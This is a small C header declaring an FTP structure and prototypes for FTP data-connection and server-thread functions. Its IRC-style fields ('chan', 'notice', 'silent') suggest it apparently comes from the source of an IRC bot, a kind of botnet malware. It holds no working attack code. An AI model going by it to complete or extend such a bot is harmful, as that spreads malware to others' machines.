#ifndef NO_FTPD
typedef struct FTP 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FTP;

int ftp_Data_connect(char *ip,int port);
int Ftp_data_transfer();
DWORD WINAPI ftpd(LPVOID pParam);
#endif